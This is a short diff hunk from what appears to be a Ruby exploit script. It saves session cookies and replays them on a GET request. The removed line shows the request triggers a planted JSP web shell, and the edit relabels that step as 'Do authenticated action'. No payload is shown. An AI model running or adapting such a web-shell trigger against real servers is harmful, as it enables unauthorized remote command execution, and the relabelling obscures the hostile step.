@@ -164,7 +164,7 @@ Net::HTTP.start(uri2.host, uri2.port) do |http|
   p_response = http.request(p_request)
   cookies    = p_response.response['set-cookie']	# Save Cookies
   
-  puts "[*] Triggering '#{shell_name}' JSP Shell"
+  puts "[*] Do authenticated action"
   Net::HTTP::Get.new(uri2)
   g_request  = Net::HTTP::Get.new(uri2)
   g_request['Cookie'] = cookies				# Restore Saved Cookies
